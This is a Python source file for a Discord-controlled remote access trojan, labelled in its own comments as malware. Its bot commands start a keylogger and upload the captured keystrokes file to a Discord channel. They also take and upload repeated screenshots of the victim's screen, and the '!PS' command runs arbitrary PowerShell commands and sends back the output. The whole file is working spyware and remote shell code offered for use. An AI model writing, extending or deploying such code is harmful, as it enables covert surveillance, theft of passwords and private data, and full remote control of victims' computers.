#imoporting mal. library
from asyncio.tasks import sleep
import os
import subprocess
from sys import stdout
from discord import channel
from pynput.keyboard import Key, Controller
from subprocess import call
import time
import pyautogui

#importing discord libraries
import discord
from dotenv import load_dotenv
from discord.ext import commands  # using bot


#importing discord tokens from .env file
load_dotenv()
TOKEN = os.getenv('DISCORD_TOKEN')
GUILD = os.getenv('DISCORD_GUILD')

keyboard = Controller()

def Start_Key():
    proc = subprocess.Popen(["python", "key_log.py"], shell=True)


bot = commands.Bot(command_prefix='!')
#############################################################################
############################# 1st Bot #######################################
@bot.command(
    name='Keylog',
    help='Start Keylog'
)
async def key_log_f(ctx):
    Start_Key()
#############################################################################

############################# 2nd Bot #######################################
@bot.command(
    name='Stop_keylog',
    help='Stop the Keylog function'
)
async def another(ctx):
    keyboard.press(Key.esc)
    keyboard.release(Key.esc)
#############################################################################

############################# 3rd Bot #######################################
@bot.command(
    name='Send_keylog',
    help=(
        'Send keylog file to the server'
    )
)
async def screen(ctx):
    channel = ctx.channel
    file = discord.File("inp.txt",filename="inp.txt")
    #Upload the keylog file
    await channel.send("inp.txt", file=file)
#############################################################################

############################# 4rd Bot #######################################
@bot.command(
    name='Screenshot',
    help=(
        'Take screenshot. Syntax: !Screenshot number_of_ss wait_time_sec'
        )
)
async def screen(ctx,no_of_ss:int,wait_time_ss:float):
    channel = ctx.channel
    for i in range(1,no_of_ss+1):
        my_ss = pyautogui.screenshot()
        my_ss.save("im1.jpg")
        file = discord.File("im1.jpg", filename="im1.jpg")
        #Upload the screenshot file
        await channel.send("im1.jpg",file=file)
        time.sleep(wait_time_ss)
#############################################################################

############################# 5th Bot #######################################
@bot.command(
    name='PS',
    help='Run powershell command Syntax: !PS your_command'
)
async def another(ctx,*args):
    f_com = ' '.join(args)
    channel = ctx.channel
    comm = os.popen('powershell %s' %f_com)
    await ctx.send(comm.read())
############################################################################p#

bot.run(TOKEN)
